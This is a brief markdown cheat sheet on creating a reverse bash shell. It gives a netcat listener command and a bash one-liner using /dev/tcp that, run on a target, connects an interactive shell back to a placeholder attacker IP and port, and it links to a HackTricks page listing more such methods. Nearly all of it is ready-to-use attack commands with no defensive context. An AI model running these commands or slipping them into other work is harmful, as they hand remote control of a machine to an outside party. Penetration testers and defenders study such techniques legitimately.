### Create a reverse bash shell

1. Setup listener on your local machine
`sudo nc -lvn 9898`

2. Connect to the listener from the target
`bash -c 'bash -i >& /dev/tcp/your-ip/your-port 0>&1'`

### A long list of ways to create a reverse shell
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
